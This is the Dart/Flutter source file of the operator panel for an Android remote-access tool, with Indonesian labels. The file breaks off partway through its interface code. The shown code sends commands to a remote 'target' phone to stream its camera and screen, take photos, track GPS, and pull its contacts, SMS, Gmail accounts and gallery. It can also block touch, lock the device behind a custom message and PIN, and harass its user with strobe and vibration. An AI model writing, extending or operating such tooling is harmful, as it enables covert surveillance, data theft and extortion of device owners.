import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';
import 'api_config.dart';

class Sk {
  // Metal
  static const Color metalDeep   = Color(0xFF15130F);
  static const Color metalDark   = Color(0xFF252220);
  static const Color metalMid    = Color(0xFF3A3630);
  static const Color metalLight  = Color(0xFF55504A);
  static const Color metalHi     = Color(0xFF7A7368);

  // Brass
  static const Color brassDeep   = Color(0xFF5C4410);
  static const Color brassDark   = Color(0xFF8B6914);
  static const Color brass       = Color(0xFFC9A961);
  static const Color brassHi     = Color(0xFFE8C87F);
  static const Color brassShine  = Color(0xFFF5DEB3);

  // Red (primary accent)
  static const Color redDeep     = Color(0xFF3D0808);
  static const Color red         = Color(0xFF8B1818);
  static const Color redBright   = Color(0xFFC41E1E);
  static const Color redGlow     = Color(0xFFFF3030);
  static const Color redHi       = Color(0xFFFF4D47);

  // Green (success)
  static const Color greenDeep   = Color(0xFF0A2818);
  static const Color green       = Color(0xFF2E7D32);
  static const Color greenHi     = Color(0xFF4CAF50);
  static const Color greenGlow   = Color(0xFF00E676);

  // Amber (warning)
  static const Color amberDeep   = Color(0xFF4A2800);
  static const Color amber       = Color(0xFFCC7A00);
  static const Color amberHi     = Color(0xFFFFB300);

  // Cyan (info)
  static const Color cyanDeep    = Color(0xFF0A2D2D);
  static const Color cyan        = Color(0xFF00838F);
  static const Color cyanHi      = Color(0xFF26C6DA);

  // Purple (secondary)
  static const Color purpleDeep  = Color(0xFF2A0A3D);
  static const Color purple      = Color(0xFF6A1B9A);
  static const Color purpleHi    = Color(0xFF9C27B0);

  // Surface
  static const Color leather     = Color(0xFF2A1F18);
  static const Color leatherDark = Color(0xFF1A1310);
  static const Color leatherHi   = Color(0xFF3D2E22);
  static const Color cream       = Color(0xFFE8DFC8);
  static const Color ink         = Color(0xFF2A2520);
}

// ═══════════════════════════════════════════════════════════
// REUSABLE COMPONENTS
// ═══════════════════════════════════════════════════════════

/// Static LED
class _Led extends StatelessWidget {
  final Color color;
  final double size;
  const _Led({required this.color, this.size = 7});

  @override
  Widget build(BuildContext context) {
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        color: color,
        boxShadow: [
          BoxShadow(
            color: color.withOpacity(0.7),
            blurRadius: size,
            spreadRadius: 0.5,
          ),
          BoxShadow(
            color: color.withOpacity(0.4),
            blurRadius: size * 2,
            spreadRadius: 1,
          ),
        ],
      ),
    );
  }
}

/// Small rivet
class _Rivet extends StatelessWidget {
  final double size;
  const _Rivet({this.size = 5});
  @override
  Widget build(BuildContext context) {
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        gradient: const LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [Sk.brassHi, Sk.brassDeep],
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.5),
            offset: const Offset(1, 1),
            blurRadius: 1,
          ),
        ],
      ),
    );
  }
}

/// Small screw
class _Screw extends StatelessWidget {
  final double size;
  const _Screw({this.size = 10});
  @override
  Widget build(BuildContext context) {
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        gradient: const LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [Sk.metalHi, Sk.metalDark],
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.6),
            offset: const Offset(1, 1),
            blurRadius: 2,
          ),
        ],
      ),
      child: Center(
        child: Container(
          width: size * 0.6,
          height: 1.2,
          color: Colors.black.withOpacity(0.7),
        ),
      ),
    );
  }
}

/// Soft metal panel
class _SoftPanel extends StatelessWidget {
  final Widget child;
  final EdgeInsets padding;
  final double radius;
  final Color? accent;
  const _SoftPanel({
    required this.child,
    this.padding = const EdgeInsets.all(14),
    this.radius = 12,
    this.accent,
  });

  @override
  Widget build(BuildContext context) {
    final accentColor = accent ?? Sk.metalLight;
    return Container(
      padding: padding,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(radius),
        gradient: const LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [Sk.leather, Sk.leatherDark],
        ),
        border: Border.all(color: accentColor, width: 1.2),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.55),
            offset: const Offset(0, 4),
            blurRadius: 8,
          ),
          BoxShadow(
            color: Colors.white.withOpacity(0.06),
            offset: const Offset(-1, -1),
            blurRadius: 2,
          ),
        ],
      ),
      child: child,
    );
  }
}

/// Inset panel
class _SoftInset extends StatelessWidget {
  final Widget child;
  final EdgeInsets padding;
  const _SoftInset({
    required this.child,
    this.padding = const EdgeInsets.symmetric(horizontal: 12),
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: padding,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(8),
        color: const Color(0xFF0F0D0B),
        border: Border.all(color: Sk.metalDark, width: 1.5),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.8),
            offset: const Offset(0, 1),
            blurRadius: 2,
          ),
          BoxShadow(
            color: Colors.white.withOpacity(0.04),
            offset: const Offset(0, -1),
            blurRadius: 1,
          ),
        ],
      ),
      child: child,
    );
  }
}

// ═══════════════════════════════════════════════════════════
// CONTROL CENTER PAGE
// ═══════════════════════════════════════════════════════════
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({
    super.key,
    this.targetDevice,
    this.role = 'owner',
  });
  @override
  State<ControlCenterPage> createState() => _ControlCenterState();
}

class _ControlCenterState extends State<ControlCenterPage> {
  static const Set<String> _needPoll = {
    'take_photo', 'get_screen', 'get_location', 'track_gps',
    'get_contacts', 'dump_contacts', 'get_gmails', 'get_sms', 'get_gallery',
    'get_apps', 'lock_app', 'unlock_app',
  };

  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  // App Manager
  List<Map<String, dynamic>> _appList = [];
  bool _loadingApps = true;
  String? _adminPin = '1234';

  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model =>
      widget.targetDevice?['model']?.toString() ?? 'Device';
  String get _battery =>
      widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _initialize();
  }

  Future<void> _initialize() async {
    try {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        _cmd('force_open', silent: true);
        Future.delayed(const Duration(seconds: 1), () => _getAppList());
      });
      _chatTimer =
          Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    } catch (_) {}
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    super.dispose();
  }

  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0,
          '[${DateTime.now().toString().substring(11, 19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = Sk.redBright}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: Sk.metalDark,
        content: Row(
          children: [
            _Led(color: c, size: 8),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                m,
                style: const TextStyle(
                  color: Sk.cream,
                  fontWeight: FontWeight.w700,
                  fontSize: 11,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ),
          ],
        ),
        duration: const Duration(seconds: 2),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(8),
          side: BorderSide(color: c.withOpacity(0.6), width: 1.5),
        ),
        margin: const EdgeInsets.all(14),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // SEND COMMAND
  // ═══════════════════════════════════════════════════════════
  Future<void> _cmd(String cmd,
      {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') {
      if (!silent) _toast('ID target tidak valid');
      return;
    }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('$baseUrl/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Terkirim', c: Sk.greenHi);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) {
          _addLog('Error $cmd (${res.statusCode})');
          _toast('Target offline');
        }
      }
    } catch (e) {
      if (!silent) {
        _addLog('Conn error: $e');
        _toast('Koneksi gagal');
      }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ═══════════════════════════════════════════════════════════
  // POLL RESPONSE
  // ═══════════════════════════════════════════════════════════
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0;
    bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http
            .get(Uri.parse('$baseUrl/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 &&
            res.body.isNotEmpty &&
            res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) {
              _onResponse(cmd, d['data']);
              got = true;
            }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) {
          _toast('Foto kosong');
          return;
        }
        _addLog('Foto diterima');
        _imgDialog(b, 'Foto Target');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot diterima');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location':
      case 'track_gps':
        _addLog('GPS diterima');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts':
      case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} kontak');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Akun diterima');
        _textDialog('Akun & Email', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} foto gallery');
        _gallerySheet(imgs);
        break;
      case 'get_apps':
        final apps = d['apps'] as List? ?? [];
        _addLog('${apps.length} apps ditemukan');
        setState(() {
          _appList =
              apps.map((a) => Map<String, dynamic>.from(a)).toList();
          _loadingApps = false;
        });
        break;
      case 'lock_app':
        final appName = d['appName']?.toString() ?? 'unknown';
        final pkg = d['package']?.toString() ?? '';
        _addLog('App locked: $appName');
        setState(() {
          final i = _appList.indexWhere((a) => a['package'] == pkg);
          if (i != -1) _appList[i]['locked'] = true;
        });
        _toast('App $appName terkunci', c: Sk.greenHi);
        break;
      case 'unlock_app':
        final appName = d['appName']?.toString() ?? 'unknown';
        final pkg = d['package']?.toString() ?? '';
        _addLog('App unlocked: $appName');
        setState(() {
          final i = _appList.indexWhere((a) => a['package'] == pkg);
          if (i != -1) _appList[i]['locked'] = false;
        });
        _toast('App $appName terbuka', c: Sk.greenHi);
        break;
      default:
        _addLog('$cmd selesai');
    }
  }

  // ═══════════════════════════════════════════════════════════
  // APP MANAGER
  // ═══════════════════════════════════════════════════════════
  Future<void> _getAppList() async {
    setState(() => _loadingApps = true);
    await _cmd('get_apps');

    Future.delayed(const Duration(seconds: 5), () {
      if (mounted && _appList.isEmpty && _loadingApps) {
        setState(() {
          _appList = [
            {'name': 'WhatsApp', 'package': 'com.whatsapp', 'locked': false},
            {'name': 'Telegram', 'package': 'org.telegram.messenger', 'locked': false},
            {'name': 'Instagram', 'package': 'com.instagram.android', 'locked': false},
            {'name': 'YouTube', 'package': 'com.google.android.youtube', 'locked': false},
            {'name': 'Chrome', 'package': 'com.android.chrome', 'locked': false},
            {'name': 'Gmail', 'package': 'com.google.android.gm', 'locked': false},
            {'name': 'Maps', 'package': 'com.google.android.apps.maps', 'locked': false},
            {'name': 'Spotify', 'package': 'com.spotify.music', 'locked': false},
            {'name': 'TikTok', 'package': 'com.zhiliaoapp.musically', 'locked': false},
            {'name': 'Twitter', 'package': 'com.twitter.android', 'locked': false},
          ];
          _loadingApps = false;
        });
      }
    });
  }

  void _showLockAppDialog(
      String appName, String packageName, bool isLocked) async {
    if (isLocked) {
      final pinCtrl = TextEditingController();
      final result = await showDialog<String>(
        context: context,
        barrierDismissible: false,
        barrierColor: Colors.black.withOpacity(0.85),
        builder: (_) => _buildDialog(
          icon: Icons.lock_open_rounded,
          iconColor: Sk.greenHi,
          title: 'UNLOCK APP',
          subtitle: 'Masukkan PIN admin untuk membuka: $appName',
          child: _SoftInset(
            child: TextField(
              controller: pinCtrl,
              keyboardType: TextInputType.number,
              obscureText: true,
              maxLength: 6,
              style: const TextStyle(
                  color: Sk.cream,
                  fontSize: 16,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 3),
              cursorColor: Sk.brass,
              decoration: const InputDecoration(
                labelText: 'PIN ADMIN',
                labelStyle: TextStyle(
                    color: Sk.brass, fontSize: 10, fontFamily: 'Orbitron'),
                border: InputBorder.none,
                counterText: '',
              ),
            ),
          ),
          actions: [
            _MetalButton(
              label: 'BATAL',
              color: Sk.metalLight,
              height: 42,
              onTap: () => Navigator.pop(context, null),
            ),
            _MetalButton(
              label: 'UNLOCK',
              color: Sk.greenHi,
              height: 42,
              icon: Icons.lock_open_rounded,
              onTap: () {
                final pin = pinCtrl.text.trim();
                if (pin.isEmpty) {
                  _toast('Masukkan PIN', c: Sk.amberHi);
                  return;
                }
                if (pin != _adminPin) {
                  _toast('PIN SALAH!', c: Sk.redBright);
                  return;
                }
                Navigator.pop(context, pin);
              },
            ),
          ],
        ),
      );
      if (result != null) {
        await _cmd('unlock_app', extra: '$appName|$packageName|$result');
        setState(() {
          final i =
              _appList.indexWhere((a) => a['package'] == packageName);
          if (i != -1) _appList[i]['locked'] = false;
        });
      }
    } else {
      final pinCtrl = TextEditingController();
      final result = await showDialog<String>(
        context: context,
        barrierDismissible: false,
        barrierColor: Colors.black.withOpacity(0.85),
        builder: (_) => _buildDialog(
          icon: Icons.lock_rounded,
          iconColor: Sk.redBright,
          title: 'LOCK APP',
          subtitle: 'Set PIN untuk mengunci: $appName',
          child: _SoftInset(
            child: TextField(
              controller: pinCtrl,
              keyboardType: TextInputType.number,
              obscureText: true,
              maxLength: 6,
              style: const TextStyle(
                  color: Sk.cream,
                  fontSize: 16,
                  fontFamily: 'ShareTechMono',
                  letterSpacing: 3),
              cursorColor: Sk.brass,
              decoration: const InputDecoration(
                labelText: 'PIN (4-6 digit)',
                labelStyle: TextStyle(
                    color: Sk.brass, fontSize: 10, fontFamily: 'Orbitron'),
                border: InputBorder.none,
                counterText: '',
              ),
            ),
          ),
          actions: [
            _MetalButton(
              label: 'BATAL',
              color: Sk.metalLight,
              height: 42,
              onTap: () => Navigator.pop(context, null),
            ),
            _MetalButton(
              label: 'LOCK',
              color: Sk.redBright,
              height: 42,
              icon: Icons.lock_rounded,
              onTap: () {
                final pin = pinCtrl.text.trim();
                if (pin.isEmpty || pin.length < 4) {
                  _toast('PIN minimal 4 digit', c: Sk.amberHi);
                  return;
                }
                _adminPin = pin;
                Navigator.pop(context, pin);
              },
            ),
          ],
        ),
      );
      if (result != null) {
        await _cmd('lock_app', extra: '$appName|$packageName|$result');
        setState(() {
          final i =
              _appList.indexWhere((a) => a['package'] == packageName);
          if (i != -1) _appList[i]['locked'] = true;
        });
      }
    }
  }

  // ═══════════════════════════════════════════════════════════
  // LIVE STREAM
  // ═══════════════════════════════════════════════════════════
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'KAMERA DEPAN' : 'KAMERA BELAKANG')
          : 'SCREEN';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) {
        _liveTimer?.cancel();
        return;
      }
      try {
        final res = await http
            .get(Uri.parse('$baseUrl/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw =
              (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms =
                  DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) {
      setState(() {
        _liveOn = false;
        _frame = null;
      });
    }
    _cmd('live_stop', silent: true);
    _addLog('Live dihentikan');
  }

  // ═══════════════════════════════════════════════════════════
  // CHAT
  // ═══════════════════════════════════════════════════════════
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http
          .get(Uri.parse('$baseUrl/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs =
            (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? '',
              });
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({
          'from': 'owner',
          'text': text.trim(),
          'time': TimeOfDay.now().format(context),
        }));
    _scrollChat();
    try {
      await http.post(
        Uri.parse('$baseUrl/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  // ═══════════════════════════════════════════════════════════
  // BUILD
  // ═══════════════════════════════════════════════════════════
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF1A1310),
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              Color(0xFF2A1F18),
              Color(0xFF1A1310),
              Color(0xFF0F0A08),
            ],
          ),
        ),
        child: SafeArea(
          child: Column(
            children: [
              _buildHeaderBar(),
              Expanded(
                child: SingleChildScrollView(
                  physics: const BouncingScrollPhysics(),
                  padding: const EdgeInsets.fromLTRB(14, 8, 14, 20),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      // Live stream section
                      _buildSection('LIVE STREAM', Sk.redBright, [
                        _DeviceButton(
                          label: 'Live Camera',
                          icon: Icons.videocam_rounded,
                          color: Sk.redBright,
                          onTap: () => _showCamPicker((side) {
                            _startLive('live_camera_start', side);
                            _showLiveDialog();
                          }),
                        ),
                        _DeviceButton(
                          label: 'Live Screen',
                          icon: Icons.desktop_windows_rounded,
                          color: Sk.amberHi,
                          onTap: () {
                            _startLive('live_screen_start', '');
                            _showLiveDialog();
                          },
                        ),
                        if (_liveOn)
                          _DeviceButton(
                            label: 'Stop Live',
                            icon: Icons.stop_rounded,
                            color: Sk.red,
                            onTap: _stopLive,
                          ),
                      ]),

                      // Camera section
                      _buildSection('CAMERA', Sk.amberHi, [
                        _DeviceButton(
                          label: 'Take Photo',
                          icon: Icons.camera_alt_rounded,
                          color: Sk.amberHi,
                          onTap: () => _showCamPicker(
                              (s) => _cmd('take_photo', extra: s)),
                        ),
                        _DeviceButton(
                          label: 'Screenshot',
                          icon: Icons.screenshot_monitor,
                          color: Sk.redBright,
                          onTap: () => _cmd('get_screen'),
                        ),
                        _DeviceButton(
                          label: 'Set Wallpaper',
                          icon: Icons.wallpaper_rounded,
                          color: Sk.redHi,
                          onTap: () => _inputDialog('Set Wallpaper',
                              'Image URL', (v) => _cmd('set_wallpaper', extra: v)),
                        ),
                        _DeviceButton(
                          label: 'Strobe ON',
                          icon: Icons.flash_on_rounded,
                          color: Sk.amberHi,
                          onTap: () => _cmd('flash_strobe'),
                        ),
                        _DeviceButton(
                          label: 'Strobe OFF',
                          icon: Icons.flash_off_rounded,
                          color: Sk.metalLight,
                          onTap: () => _cmd('stop_strobe'),
                        ),
                      ]),

                      // Intelligence section
                      _buildSection('INTELLIGENCE', Sk.cyanHi, [
                        _DeviceButton(
                          label: 'Contacts',
                          icon: Icons.contacts_rounded,
                          color: Sk.cyanHi,
                          onTap: () => _cmd('get_contacts'),
                        ),
                        _DeviceButton(
                          label: 'GPS Location',
                          icon: Icons.my_location_rounded,
                          color: Sk.greenHi,
                          onTap: () => _cmd('get_location'),
                        ),
                        _DeviceButton(
                          label: 'Gmail & Accounts',
                          icon: Icons.account_circle_rounded,
                          color: Sk.redBright,
                          onTap: () => _cmd('get_gmails'),
                        ),
                        _DeviceButton(
                          label: 'SMS Inbox',
                          icon: Icons.sms_rounded,
                          color: Sk.amberHi,
                          onTap: () => _cmd('get_sms'),
                        ),
                        _DeviceButton(
                          label: 'Notifications',
                          icon: Icons.notifications_rounded,
                          color: Sk.purpleHi,
                          onTap: () => _fetchNotif(),
                        ),
                        _DeviceButton(
                          label: 'Gallery (5 Photos)',
                          icon: Icons.photo_library_rounded,
                          color: Sk.redHi,
                          onTap: () => _cmd('get_gallery', extra: '5'),
                        ),
                        _DeviceButton(
                          label: 'Request Notif Access',
                          icon: Icons.security_rounded,
                          color: Sk.metalLight,
                          onTap: () => _cmd('open_notification_settings'),
                        ),
                        _DeviceButton(
                          label: 'Touch Block',
                          icon: Icons.touch_app,
                          color: Sk.red,
                          onTap: _showTouchBlockDialog,
                        ),
                      ]),

                      // Audio section
                      _buildSection('AUDIO', Sk.purpleHi, [
                        _DeviceButton(
                          label: 'Play Audio',
                          icon: Icons.play_circle_rounded,
                          color: Sk.amberHi,
                          onTap: () => _inputDialog('Play Audio',
                              'MP3 URL', (v) => _cmd('play_audio', extra: v)),
                        ),
                        _DeviceButton(
                          label: 'Stop Audio',
                          icon: Icons.stop_circle_rounded,
                          color: Sk.metalLight,
                          onTap: () => _cmd('stop_audio'),
                        ),
                        _DeviceButton(
                          label: 'Vibrate Loop',
                          icon: Icons.vibration_rounded,
                          color: Sk.redHi,
                          onTap: () => _cmd('vibrate_loop'),
                        ),
                        _DeviceButton(
                          label: 'Open URL',
                          icon: Icons.open_in_browser,
                          color: Sk.redBright,
                          onTap: () => _inputDialog('Open URL',
                              'https://...', (v) => _cmd('open_url', extra: v)),
                        ),
                        _DeviceButton(
                          label: 'Kill WiFi',
                          icon: Icons.wifi_off_rounded,
                          color: Sk.amberHi,
                          onTap: () => _cmd('kill_wifi'),
                        ),
                      ]),

                      // Lock & Chat
                      _buildSection('LOCK & CHAT', Sk.redBright, [
                        _DeviceButton(
                          label: 'Lock Live + Chat',
                          icon: Icons.lock_rounded,
                          color: Sk.red,
                          onTap: _lockLiveDialog,
                        ),
                        _DeviceButton(
                          label: 'Lock Device',
                          icon: Icons.lock_outline_rounded,
                          color: Sk.amberHi,
                          onTap: () => _inputDialog('Lock Device',
                              'Pesan di layar lock', (msg) {
                            _inputDialog('PIN Unlock', '4 digit PIN',
                                (pin) => _cmd('hard_lock', extra: '$msg|$pin'),
                                isNumber: true, hint: '1234');
                          }),
                        ),
                        _DeviceButton(
                          label: 'Unlock Device',
                          icon: Icons.lock_open_rounded,
                          color: Sk.greenHi,
                          onTap: () => _cmd('unlock'),
                        ),
                      ]),

                      // Device
                      _buildSection('DEVICE', Sk.greenHi, [
                        _DeviceButton(
                          label: 'Restart Device',
                          icon: Icons.restart_alt_rounded,
                          color: Sk.amberHi,
                          onTap: _showRestartDialog,
                        ),
                        _DeviceButton(
                          label: 'Wake Up Target',
                          icon: Icons.wb_sunny_rounded,
                          color: Sk.greenHi,
                          onTap: () => _cmd('force_open'),
                        ),
                      ]),

                      // Apps Manager
                      _buildSection('APPS MANAGER', Sk.redBright, [
                        _DeviceButton(
                          label: 'Refresh Apps',
                          icon: Icons.refresh_rounded,
                          color: Sk.redBright,
                          onTap: _getAppList,
                        ),
                        _DeviceButton(
                          label: 'PIN Admin',
                          icon: Icons.security_rounded,
                          color: Sk.amberHi,
                          onTap: _showChangePinDialog,
                        ),
                      ]),

                      // Apps list
                      _buildAppsPanel(),

                      // Chat section
                      _buildSection('CHAT WITH TARGET', Sk.purpleHi, []),
                      _buildChatPanel(),

                      // Log section
                      _buildSection('ACTIVITY LOG', Sk.metalLight, []),
                      _buildLogPanel(),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════
  // HEADER BAR
  // ═══════════════════════════════════════════════════════════
  Widget _buildHeaderBar() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
      child: Container(
        height: 60,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(12),
          gradient: const LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Sk.metalMid, Sk.metalDark],
          ),
          border: Border.all(color: Sk.redBright.withOpacity(0.5), width: 1.2),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.7),
              offset: const Offset(0, 4),
              blurRadius: 8,
            ),
            BoxShadow(
              color: Sk.redBright.withOpacity(0.15),
              blurRadius: 15,
              spreadRadius: 0,
            ),
          ],
        ),
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 10),
          child: Row(
            children: [
              const _Screw(size: 12),
              const SizedBox(width: 8),
              _MetalIconButton(
                icon: Icons.arrow_back_ios_new_rounded,
                onTap: () {
                  if (_liveOn) _stopLive();
                  Navigator.pop(context);
                },
              ),
              const SizedBox(width: 10),
              const _Led(color: Sk.redGlow, size: 8),
              const SizedBox(width: 10),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Row(
                      children: [
                        const Text(
                          'CONTROL CENTER',
                          style: TextStyle(
                            color: Sk.redBright,
                            fontSize: 13,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'Orbitron',
                            letterSpacing: 1.8,
                            shadows: [
                              Shadow(
                                color: Colors.black,
                                offset: Offset(0, 1),
                                blurRadius: 2,
                              ),
                              Shadow(
                                color: Sk.redGlow,
                                offset: Offset(0, 0),
                                blurRadius: 6,
                              ),
                            ],
                          ),
                        ),
                        const SizedBox(width: 8),
                        Container(
                          padding: const EdgeInsets.symmetric(
                              horizontal: 6, vertical: 2),
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(3),
                            color: Sk.greenDeep,
                            border: Border.all(
                                color: Sk.greenHi.withOpacity(0.6),
                                width: 1),
                          ),
                          child: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              const _Led(color: Sk.greenGlow, size: 5),
                              const SizedBox(width: 4),
                              Text(
                                '$_battery%',
                                style: const TextStyle(
                                  color: Sk.greenGlow,
                                  fontSize: 8,
                                  fontWeight: FontWeight.w900,
                                  fontFamily: 'Orbitron',
                                  letterSpacing: 0.5,
                                ),
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 2),
                    Text(
                      'DEVICE: ${_model.length > 20 ? '${_model.substring(0, 20)}...' : _model}',
                      style: TextStyle(
                        color: Sk.cream.withOpacity(0.55),
                        fontSize: 9,
                        fontFamily: 'ShareTechMono',
                        fontWeight: FontWeight.w700,
                        letterSpacing: 0.5,
                      ),
                    ),
                  ],
                ),
              ),
              if (_liveOn) ...[
                Container(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(4),
                    color: Sk.redDeep,
                    border: Border.all(
                        color: Sk.redGlow.withOpacity(0.6), width: 1),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const _Led(color: Sk.redGlow, size: 5),
                      const SizedBox(width: 4),
                      Text(
                        '$_fps FPS',
                        style: const TextStyle(
                          color: Sk.redGlow,
                          fontSize: 8,
                          fontWeight: FontWeight.w900,
                          fontFamily: 'Orbitron',
                          letterSpacing: 0.5,
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 6),
              ],
              if (_sending)
                const Padding(
                  padding: EdgeInsets.only(right: 6),
